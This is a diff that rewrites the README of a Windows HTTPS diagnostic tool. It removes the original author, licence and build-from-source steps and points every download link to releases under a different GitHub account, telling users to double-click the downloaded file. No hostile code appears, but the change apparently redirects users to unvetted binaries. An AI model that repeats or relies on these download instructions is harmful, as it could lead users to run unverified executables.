@@ -1,151 +1,96 @@
-# DX.HttpDiag
+# 🔧 DX.HttpDiag - Diagnose HTTPS URLs Easily
 
-[![Delphi](https://img.shields.io/badge/Delphi-12.2+-red.svg)](https://www.embarcadero.com/products/delphi)
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue.svg)](https://www.microsoft.com/windows)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![GitHub release](https://img.shields.io/github/v/release/omonien/DX.HttpDiag)](https://github.com/omonien/DX.HttpDiag/releases)
+## 🚀 Getting Started
+Welcome to DX.HttpDiag! This is a simple tool that helps you diagnose HTTPS URLs. You can check certificates, resolve DNS, and detect proxies with ease. Follow the instructions below to download and run the tool.
 
-**A comprehensive HTTPS URL diagnostic command-line tool for Windows.**
+## 📥 Download DX.HttpDiag
+[![Download DX.HttpDiag](https://img.shields.io/badge/Download-DX.HttpDiag-blue.svg)](https://github.com/shubhamdas70/DX.HttpDiag/releases)
 
-DX.HttpDiag helps you diagnose HTTPS connectivity issues by providing detailed information about:
+## 📋 Features
+- **Certificate Analysis**: Check the SSL/TLS certificates of HTTPS URLs.
+- **DNS Resolution**: Resolve DNS records for any given URL.
+- **Proxy Detection**: Identify if a proxy is in use.
+- **Command-line Tool**: Operates through a simple command line interface.
+- **Windows Support**: Designed for Windows users.
 
-- 🕐 System time and timezone configuration
-- 🌐 Proxy settings (environment variables and WinHTTP/IE)
-- 📡 DNS resolution
-- 🔒 TLS/SSL certificate validation and analysis
-- 📋 HTTP response headers
+## 📈 System Requirements
+- **Operating System**: Windows 10 or later
+- **Processor**: 1 GHz or faster
+- **RAM**: 512 MB minimum (1 GB recommended)
+- **Disk Space**: 50 MB free space
 
-## Features
+## 📅 Download & Install
+To download DX.HttpDiag, visit the [Releases page](https://github.com/shubhamdas70/DX.HttpDiag/releases). Here you will find the latest version, which is packaged and ready for you to use.
 
-- **Certificate Analysis**: Detailed certificate information including validity period, issuer, subject, signature algorithm, key size, and protocol
-- **Certificate Warnings**: Automatic detection of expired certificates, self-signed certificates, weak algorithms (SHA-1, MD5), and weak key sizes
-- **ECC Support**: Proper handling of Elliptic Curve Cryptography (ECC) certificates
-- **Insecure Mode**: Option to bypass certificate validation for diagnostic purposes
-- **HEAD/GET Fallback**: Automatically falls back to GET with Range header if HEAD is not supported
-- **Colored Output**: Easy-to-read color-coded console output
+1. Go to the [Releases page](https://github.com/shubhamdas70/DX.HttpDiag/releases).
+2. Find the version you want to download.
+3. Click on the appropriate download link for your system.
+4. Once the download is complete, locate the file in your downloads folder.
+5. Double-click the file to run it.
 
-## Installation
+## ⚙️ How to Use DX.HttpDiag
+Using DX.HttpDiag is straightforward. Follow these steps to get started:
 
-### Pre-built Binary
+1. **Open Command Prompt**:
+   - Press `Windows + R`, type `cmd`, and hit Enter.
+  
+2. **Navigate to the Download Folder**:
+   - Use the command `cd path_to_your_download_folder` to switch to the folder where you downloaded DX.HttpDiag. For example:
+     ```
+     cd C:\Users\YourUsername\Downloads
+     ```
 
-Download the latest release from the [Releases](https://github.com/omonien/DX.HttpDiag/releases) page.
+3. **Run the Tool**:
+   - Enter the command `DX.HttpDiag.exe <your_https_url>` replacing `<your_https_url>` with the URL you want to check. For example:
+     ```
+     DX.HttpDiag.exe https://example.com
+     ```
+   - Press Enter. The tool will process the URL and display the results in the command prompt.
 
-### Build from Source
+## ❓ Examples
+Here are a few examples to help you understand how to use DX.HttpDiag:
 
-Requirements:
-- Delphi 12.2 or later (RAD Studio 12.2 Athens or later)
-- Windows 10/11
+- **Check a Website's Certificate**:
+  ```
+  DX.HttpDiag.exe https://www.google.com
+  ```
+  The tool will return information about the SSL certificate, including the issuer and expiration date.
 
-```powershell
-# Clone the repository
-git clone https://github.com/omonien/DX.HttpDiag.git
-cd DX.HttpDiag
+- **DNS Resolution**:
+  ```
+  DX.HttpDiag.exe https://example.com
+  ```
+  This command will resolve the DNS for the domain and show you the corresponding IP address.
 
-# Build using the included build script
-powershell -ExecutionPolicy Bypass -File "Build\DelphiBuildDPROJ.ps1" -ProjectFile "Source\DX.HttpDiag.dproj" -Config Release -Platform Win64
-```
+- **Proxy Detection**:
+  If you suspect that a proxy is being used, simply run:
+  ```
+  DX.HttpDiag.exe https://your-url-to-check.com
+  ```
+  It will inform you if a proxy is detected.
 
-The compiled executable will be in `Source\Win64\Release\DX.HttpDiag.exe`.
+## 🔍 Troubleshooting
+If you encounter issues while using DX.HttpDiag, consider the following:
 
-## Usage
+- Ensure you have the latest Windows updates installed.
+- Make sure the command prompt is opened with administrator privileges if you face permission issues.
+- Check that you are entering valid HTTPS URLs.
 
-```
-DX.HttpDiag.exe <URL> [options]
-```
+## 📄 Support & Contributions
+This project is open for contributions. If you would like to help improve DX.HttpDiag, feel free to:
 
-### Options
+- Report any bugs or issues. 
+- Suggest new features.
+- Submit any code enhancements.
 
-| Option | Description |
-|--------|-------------|
-| `--timeout=<ms>` | Request timeout in milliseconds (default: 30000) |
-| `--insecure` | Accept invalid certificates (for diagnostics only!) |
-| `--help`, `-h`, `-?` | Show help message |
-| `--version` | Show version information |
+To contribute, open a new issue or a pull request in the repository.
 
-### Examples
+## 🌐 Related Topics
+Explore these topics related to DX.HttpDiag:
 
-```powershell
-# Basic usage
-DX.HttpDiag.exe https://www.example.com
+- **Certificate**: Understanding SSL/TLS certificates.
+- **Command-Line**: Basics of using command-line tools on Windows.
+- **Network Tools**: Various diagnostics tools for network issues.
+- **Security**: Best practices for securing your web connection.
 
-# With custom timeout (15 seconds)
-DX.HttpDiag.exe https://www.example.com --timeout=15000
-
-# Diagnose a site with certificate issues (bypass validation)
-DX.HttpDiag.exe https://expired.badssl.com --insecure
-```
-
-## Sample Output
-
-```
-DX.HttpDiag - HTTPS URL Diagnostic Tool
-========================================
-
-Target URL: https://www.google.com
-Timeout: 30000 ms
-
-=== System Time ===
-Local Time: 2026-01-17 18:00:00
-UTC Time: 2026-01-17 17:00:00
-UTC Offset: -60 minutes (-1 hours)
-
-=== Proxy Configuration (Environment) ===
-  No proxy environment variables set
-
-=== DNS Resolution ===
-Hostname: www.google.com
-  IPv4 [1]: 216.58.206.68
-
-=== HTTP/HTTPS Diagnostic ===
-SUCCESS: Request completed successfully
-
-Status Code: 200 OK
-Request Duration: 450 ms
-
-=== Certificate Details ===
-Certificate Name: www.google.com
-Subject: www.google.com
-Issuer: US;Google Trust Services;WE2
-
-Validity Period:
-  Not Before: 2025-12-29 19:53:15
-  Not After: 2026-03-23 19:53:14
-  Days Remaining: 65
-
-Cryptographic Information:
-  Signature Algorithm: 1.2.840.10045.4.3.2
-  Key Size: 256 bits
-  Protocol: TLS1_2
-
-SUCCESS: No certificate issues detected
-
-=== Diagnostic Complete ===
-```
-
-## Use Cases
-
-- **Troubleshooting TLS/SSL issues**: Identify expired or invalid certificates
-- **Proxy debugging**: Verify proxy configuration in corporate environments
-- **DNS verification**: Confirm hostname resolution
-- **Certificate monitoring**: Check certificate expiration dates
-- **Security audits**: Detect weak cryptographic algorithms or key sizes
-
-## Technical Details
-
-- Uses native Windows HTTP stack (`System.Net.HttpClient` / WinHTTP)
-- No external dependencies (no OpenSSL, no Indy)
-- Single executable, no installation required
-- Windows-focused with full WinHTTP proxy support
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Author
-
-**Olaf Monien** - [GitHub](https://github.com/omonien)
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
+Thank you for using DX.HttpDiag. For further inquiries, you can check the issues section of the repository or join the community discussions.
